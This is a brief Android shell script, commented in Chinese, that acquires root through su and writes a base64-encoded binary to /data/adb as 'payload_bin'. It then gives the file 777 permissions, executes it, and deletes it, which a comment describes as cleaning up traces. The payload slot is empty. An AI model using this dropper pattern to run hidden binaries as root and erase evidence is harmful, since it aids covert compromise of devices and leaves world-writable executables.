#!/bin/sh

# 定义目标目录和文件名
TARGET_DIR="/data/adb"
EXECUTABLE_NAME="payload_bin" # 你可以在这里修改释放后的文件名
TARGET_PATH="${TARGET_DIR}/${EXECUTABLE_NAME}"

# 1. 检查是否具有 root 权限
if [ "$(id -u)" -ne 0 ]; then
    echo "权限不足：正在尝试申请 root 权限执行..."
    # 尝试使用 su 重新运行脚本本身
    exec su -c "sh $0 $@"
    exit $?
fi

echo "[*] 当前已获取 Root 权限。"

# 2. 准备Base64数据
# 请将 <在这里粘贴你的BASE64编码数据> 替换为你用 base64 命令生成的真实文本
BASE64_DATA="

"

echo "[*] 正在释放文件到 ${TARGET_PATH} ..."

# 3. 将 Base64 数据解码并写入到目标目录
# 注意：有些精简版Android系统的 base64 命令可能需要 -d 参数，标准的可能不需要参数自动识别，通常 -d 是通用解码参数
echo "$BASE64_DATA" | base64 -d > "$TARGET_PATH"

# 检查释放是否成功
if [ ! -f "$TARGET_PATH" ]; then
    echo "[!] 错误：文件释放失败，请检查 /data/adb 目录是否可写或空间是否充足。"
    exit 1
fi

# 4. 赋予 777 最高权限
echo "[*] 正在赋予 777 权限..."
chmod 777 "$TARGET_PATH"

# 5. 执行文件
echo "[*] 开始执行 ${EXECUTABLE_NAME} ..."
"$TARGET_PATH"

# 获取执行结果的状态码
EXIT_CODE=$?

# (可选) 6. 阅后即焚：执行完毕后删除该可执行文件清理痕迹
rm -f "$TARGET_PATH"
echo "[*] 执行完毕，已清理临时文件。"

echo "[*] 脚本运行结束，退出码: $EXIT_CODE"
exit $EXIT_CODE
